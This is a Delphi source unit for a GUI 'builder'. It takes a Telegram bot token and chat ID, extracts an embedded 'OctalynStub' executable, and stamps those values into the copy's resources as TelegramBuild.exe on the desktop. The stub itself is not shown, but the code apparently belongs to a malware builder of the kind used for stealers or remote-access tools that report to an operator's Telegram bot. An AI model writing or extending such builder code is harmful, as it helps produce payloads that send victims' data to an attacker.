unit OctaTeleg;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, dxGDIPlusClasses, Vcl.ExtCtrls,
  Vcl.StdCtrls;


  type
  TResourceWriter = class
  public
    class procedure WriteServerInfoToResources(const ExePath, ServerIP: string; ServerPort: string);
  end;

type
  TForm3 = class(TForm)
    Image1: TImage;
    GroupBox1: TGroupBox;
    edtToken: TEdit;
    mychatID: TEdit;
    Label1: TLabel;
    Label2: TLabel;
    Button1: TButton;
    GroupBox2: TGroupBox;
    Label3: TLabel;
    Label4: TLabel;
    Label5: TLabel;
    Label6: TLabel;
    procedure Button1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form3: TForm3;

implementation

{$R *.dfm}



  procedure ExtractEmbeddedExeToFile(const ResourceName, OutputPath: string);
var
  ResStream: TResourceStream;
begin
  // 'RCDATA' is the type you selected when embedding
  ResStream := TResourceStream.Create(HInstance, ResourceName, RT_RCDATA);
  try
    ResStream.SaveToFile(OutputPath);
  finally
    ResStream.Free;
  end;
end;



        class procedure TResourceWriter.WriteServerInfoToResources(const ExePath, ServerIP: string; ServerPort: string);
var
  UpdateHandle: THandle;
  IPStream, PortStream: TMemoryStream;
  PortStr: string;
begin
  // Create memory streams for the resources
  IPStream := TMemoryStream.Create;
  PortStream := TMemoryStream.Create;

  try
    // Prepare the data
    IPStream.Write(ServerIP[1], Length(ServerIP) * SizeOf(Char));

    PortStr := ServerPort;
    PortStream.Write(PortStr[1], Length(PortStr) * SizeOf(Char));

    // Begin resource update on the executable
    UpdateHandle := BeginUpdateResource(PChar(ExePath), False);
    if UpdateHandle = 0 then
      raise Exception.Create('Failed to open executable for resource writing');

    try
      // Add server IP resource (ID: 101)
      if not UpdateResource(UpdateHandle, RT_RCDATA, MAKEINTRESOURCE(101),
                           MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                           IPStream.Memory, IPStream.Size) then
        raise Exception.Create('Failed to update IP resource');

      // Add server port resource (ID: 102)
      if not UpdateResource(UpdateHandle, RT_RCDATA, MAKEINTRESOURCE(102),
                           MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                           PortStream.Memory, PortStream.Size) then
        raise Exception.Create('Failed to update Port resource');

      // Commit the changes
      if not EndUpdateResource(UpdateHandle, False) then
        raise Exception.Create('Failed to commit resource changes');

    except
      // If something goes wrong, abort the update
      EndUpdateResource(UpdateHandle, True);
      raise;
    end;
  finally
    IPStream.Free;
    PortStream.Free;
  end;
end;



procedure TForm3.Button1Click(Sender: TObject);
var
  TempStubPath, DesktopPath, DestPath: string;
begin
  TempStubPath := GetEnvironmentVariable('TEMP') + '\OctalynStub_temp.exe';
  DesktopPath := GetEnvironmentVariable('USERPROFILE') + '\Desktop\';
  DestPath := DesktopPath + 'TelegramBuild.exe';

  // Validate input parameters
  if Trim(edtToken.Text) = '' then
  begin
    ShowMessage('Please enter a valid Telegram Token..');
    Exit;
  end;

  if Trim(mychatID.Text) = '' then
  begin
    ShowMessage('Please enter a valid chat ID');
    Exit;
  end;

  try
    // Extract embedded stub to a temp location
    ExtractEmbeddedExeToFile('Resource_1', TempStubPath);

    // Copy the extracted stub to the desktop as Build.exe
    if not CopyFile(PChar(TempStubPath), PChar(DestPath), False) then
      RaiseLastOSError;

    // Modify Build.exe's resources
    TResourceWriter.WriteServerInfoToResources(
      DestPath,
      edtToken.Text,
      mychatID.Text
    );

    ShowMessage('Build.exe has been created on your desktop with your server settings.');
  except
    on E: Exception do
      ShowMessage('Error: ' + E.Message);
  end;

  // Optional: Clean up temp file
  DeleteFile(TempStubPath);
end;

end.
